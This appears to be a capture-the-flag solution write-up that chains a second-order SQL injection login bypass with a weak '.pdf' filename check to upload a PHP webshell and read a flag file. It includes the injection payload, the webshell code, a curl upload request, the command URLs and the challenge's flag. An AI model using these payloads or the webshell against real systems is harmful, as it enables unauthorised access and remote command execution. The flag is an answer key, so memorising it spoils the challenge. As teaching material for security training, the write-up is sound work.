# Final Solution

## Overview

The challenge contains two vulnerabilities chained together:

1. SQL Injection in the authentication process
2. Arbitrary File Upload after authentication

The login mechanism does not use a single query for authentication. Instead, it first validates the existence of a user and then performs a second query to verify the password.

By manipulating the result of the first query, authentication can be bypassed.

After obtaining access, the upload functionality uses weak validation that can be bypassed, allowing upload of a PHP WebShell and execution of arbitrary commands.

---

## Root Cause

The authentication process trusts data returned by the first SQL query and directly uses it inside another query.

First query:

```sql
SELECT username
FROM users
WHERE username='$realusername'
```

Second query:

```sql
SELECT user_id
FROM users
WHERE username='$usernamenew'
AND password=MD5(CONCAT(MD5('$password'),MD5('$usernamenew')))
LIMIT 1
```

The application assumes that values returned by the first query are safe.

Additionally, the upload functionality only performs weak file validation:

Client-side:

```javascript
/(\.pdf)$/i
```

Server-side:

```php
strpos($fileName,'.pdf') !== false
```

The server only checks whether `.pdf` exists somewhere in the filename.

---

## Exploit Steps

### Step 1: Bypass authentication using SQL Injection

Use:

```sql
Username:
xxxxx' UNION SELECT "' OR 1=1 #" -- -

Password:
aaaaaaaa
```

The first query becomes:

```sql
SELECT username
FROM users
WHERE username='xxxxx'
UNION
SELECT "' OR 1=1 #"
```

The injected value is then used in the second query:

```sql
SELECT user_id
FROM users
WHERE username='' OR 1=1 #
AND password=...
```

This bypasses password verification and grants access.

---

### Step 2: Create WebShell

Create:

```php
<?php system($_GET['cmd']); ?>
```

Save as:

```text
shell.pdf.php
```

---

### Step 3: Bypass upload restriction

Browser validation blocks `.php` uploads, so directly send the request using curl:

```bash
curl -i -X POST \
-b "PHPSESSID=SESSION_VALUE" \
-F "invoice=@shell.pdf.php;filename=shell.pdf.php;type=application/pdf" \
http://TARGET/upload.php
```

The server accepts:

```text
shell.pdf.php
```

because it only checks whether `.pdf` exists inside the filename.

---

### Step 4: Execute commands

List files:

```text
/uploaded_invoices/shell.pdf.php?cmd=ls+/
```

Read flag:

```text
/uploaded_invoices/shell.pdf.php?cmd=cat+/FLAG.txt
```

---

## Technical Details

### SQL Injection payload

```sql
xxxxx' UNION SELECT "' OR 1=1 #" -- -
```

### WebShell

```php
<?php system($_GET['cmd']); ?>
```

### Upload bypass

```text
shell.pdf.php
```

### Flag retrieval

```bash
cat /FLAG.txt
```

---

## Impact

An attacker can:

- Bypass authentication
- Gain unauthorized access
- Upload arbitrary files
- Execute arbitrary operating system commands
- Read sensitive files
- Achieve full server compromise

---

## Mitigation

Authentication:

- Use prepared statements
- Avoid constructing SQL queries with user input
- Separate authentication logic from user-controlled data

File upload:

- Validate file content rather than filename
- Enforce allowed extensions server-side
- Rename uploaded files
- Store uploads outside the web root
- Disable script execution in upload directories

---

## Key Insight

The important observation is that authentication was not bypassed through a classic SQL injection payload.

The exploit required understanding how the application reused values from one query inside another query.

The upload vulnerability alone was insufficient; both vulnerabilities had to be chained together.

---

## Relation to Business Logic

This challenge is primarily a business logic flaw because the application trusted intermediate data produced by previous application steps.

The SQL injection exists at a technical level, but exploitation depends on understanding the application's authentication workflow and chaining multiple functionalities together.

The upload vulnerability similarly depends on inconsistencies between client-side and server-side validation logic.

---

## Flag

```text
flag{376613a6-2168-4f1c-9cbf-9c21d08cc41f}
```
